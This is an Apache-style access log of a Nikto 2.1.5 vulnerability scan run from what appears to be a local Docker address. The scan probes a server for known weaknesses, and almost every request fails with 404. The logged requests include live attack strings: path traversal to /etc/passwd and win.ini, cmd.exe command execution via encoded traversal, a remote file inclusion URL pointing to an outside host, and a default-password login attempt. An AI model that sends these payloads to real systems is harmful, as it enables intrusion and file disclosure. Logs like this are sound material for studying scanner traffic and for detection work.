172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /admin.cgi HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000353)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /interscan/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000354)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/legacy/save HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000355)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000356)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /IDSWebApp/IDSjsp/Login.jsp HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000357)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /quikstore.cfg HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000358)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /quikstore.cgi HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000359)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /securecontrolpanel/ HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000360)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /siteminder HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000361)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /webmail/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000362)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /Xcelerate/LoginPage.html HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000363)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /_cti_pvt/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000364)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /smg_Smxcfg30.exe?vcc=3560121183d3 HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000365)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /examples/servlets/index.html HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000366)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /nsn/..%5Cutil/attrib.bas HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000367)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /nsn/..%5Cutil/chkvol.bas HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000368)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /nsn/..%5Cutil/copy.bas HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000369)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /nsn/..%5Cutil/del.bas HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000370)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /nsn/..%5Cutil/dir.bas HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000371)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /nsn/..%5Cutil/dsbrowse.bas HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000372)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /nsn/..%5Cutil/glist.bas HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000373)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /nsn/..%5Cutil/lancard.bas HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000374)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /nsn/..%5Cutil/md.bas HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000375)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /nsn/..%5Cutil/rd.bas HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000376)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /nsn/..%5Cutil/ren.bas HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000377)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /nsn/..%5Cutil/send.bas HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000378)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /nsn/..%5Cutil/set.bas HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000379)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /nsn/..%5Cutil/slist.bas HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000380)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /nsn/..%5Cutil/type.bas HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000381)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /nsn/..%5Cutil/userlist.bas HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000382)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /nsn/..%5Cweb/env.bas HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000383)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /nsn/..%5Cweb/fdir.bas HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000384)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /nsn/..%5Cwebdemo/env.bas HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000385)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /nsn/..%5Cwebdemo/fdir.bas HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000386)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /wikihome/action/conflict.php?TemplateDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000387)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET // HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000396)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /webtop/wdk/ HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000397)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /SilverStream HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000398)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /signon HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000399)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /upd/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000400)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /examples/jsp/source.jsp?? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000401)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /lpt9 HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000402)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cfcache.map HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000403)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cfdocs/cfcache.map HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000404)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /CVS/Entries HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000405)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /lpt9.xtp HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000406)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /3rdparty/phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../ HTTP/1.1" 404 538 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000408)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../ HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000408)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /3rdparty/phpmyadmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../ HTTP/1.1" 404 538 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000408)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /phpmyadmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../ HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000408)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /pma/db_details_importdocsql.php?submit_show=true&do=import&docpath=../ HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000408)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /asp/sqlqhit.asp HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000409)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /asp/SQLQHit.asp HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000410)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /iissamples/issamples/sqlqhit.asp HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000411)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /iissamples/issamples/SQLQHit.asp HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000412)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /ISSamples/sqlqhit.asp HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000413)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /ISSamples/SQLQHit.asp HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000414)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /junk.aspx HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000415)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /oc/Search/sqlqhit.asp HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000416)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /oc/Search/SQLQHit.asp HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000417)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /search/htx/sqlqhit.asp HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000418)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /search/htx/SQLQHit.asp HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000419)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /search/sqlqhit.asp HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000420)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /search/SQLQHit.asp HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000421)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /sqlqhit.asp HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000422)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /SQLQHit.asp HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000423)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /?Open HTTP/1.1" 302 477 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000427)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /?OpenServer HTTP/1.1" 302 477 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000428)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /catalog.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000429)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cersvr.nsf HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000430)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cgi-bin/testing_whatever HTTP/1.1" 404 479 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000431)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /domlog.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000432)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /events4.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000433)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /log.nsf HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000434)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /names.nsf HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000435)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /LOGIN.PWD HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000436)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /USER/CONFIG.AP HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000437)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /.perf HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000444)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "get / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000445)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "INDEX / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000446)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET // HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000447)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /admin-serv/config/admpw HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000448)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /test.php%20 HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000449)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /*.* HTTP/1.1" 404 494 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000450)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cgi-bin/cgi_process HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000451)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /ht_root/wwwroot/-/local/httpd$map.conf HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000452)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /VARf6Z4FB8 HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000453)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /local/httpd$map.conf HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000454)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /tree HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000455)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /%00/ HTTP/1.1" 404 491 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000457)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /%00/ HTTP/1.1" 404 491 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000458)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /%00/ HTTP/1.1" 404 491 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000459)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /%2e/ HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000460)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /%2e/ HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000461)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /%2e/ HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000462)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /%2f/ HTTP/1.1" 404 493 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000463)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /%2f/ HTTP/1.1" 404 493 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000464)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /%2f/ HTTP/1.1" 404 493 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000465)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /%5c/ HTTP/1.1" 404 493 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000466)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /%5c/ HTTP/1.1" 404 493 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000467)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /%5c/ HTTP/1.1" 404 493 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000468)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.jsp%00x HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000469)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /weblogic HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000470)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /%a%s%p%d HTTP/1.1" 400 485 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000471)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.html%20 HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000472)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /852566C90012664F HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000473)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /hidden.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000474)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /mail.box HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000475)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /setup.nsf HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000477)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /statrep.nsf HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000478)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /webadmin.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000479)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /examples/servlet/AUX HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000481)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cfdocs/cfmlsyntaxcheck.cfm HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000483)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /Config1.htm HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000484)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /contents/extensions/asp/1 HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000485)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /WebAdmin.dll?View=Logon HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000486)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cgi-win/cgitest.exe HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000489)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000490)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /c/winnt/system32/cmd.exe?/c+dir+/OG HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000491)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /msadc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir+c:%5c HTTP/1.1" 404 543 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000494)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /msadc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir+c:%5c HTTP/1.1" 404 543 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000495)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /msadc/samples/adctest.asp HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000496)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /VzBgdRXvhD HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000497)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /somethingnotthere.ida HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000498)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cgi-shl/win-c-sample.exe HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000501)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /examples/servlet/TroubleShooter HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000502)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /goform/CheckLogin?login=root&password=tslinux HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000505)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /[SecCheck]/..%2f../ext.ini HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000506)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /[SecCheck]/..%255c..%255c../ext.ini HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000507)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /[SecCheck]/..%252f..%252f../ext.ini HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000508)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cgi/cfdocs/expeval/ExprCalc.cfm?OpenFilePath=c:\\winnt\\win.ini HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000509)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cgi/cfdocs/expeval/ExprCalc.cfm?OpenFilePath=c:\\windows\\win.ini HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000510)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /.nsf/../winnt/win.ini HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000511)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /prxdocs/misc/prxrch.idq?CiTemplate=../../../../../../../../../../winnt/win.ini HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000512)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /query.idq?CiTemplate=../../../../../../../../../../winnt/win.ini HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000513)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /iissamples/issamples/fastq.idq?CiTemplate=../../../../../../../../../../winnt/win.ini HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000514)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /iissamples/issamples/query.idq?CiTemplate=../../../../../../../../../../winnt/win.ini HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000515)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /default.htm%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20 HTTP/1.1" 404 583 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000516)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /default.htm%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20 HTTP/1.1" 404 583 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000517)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /................../config.sys HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000518)"
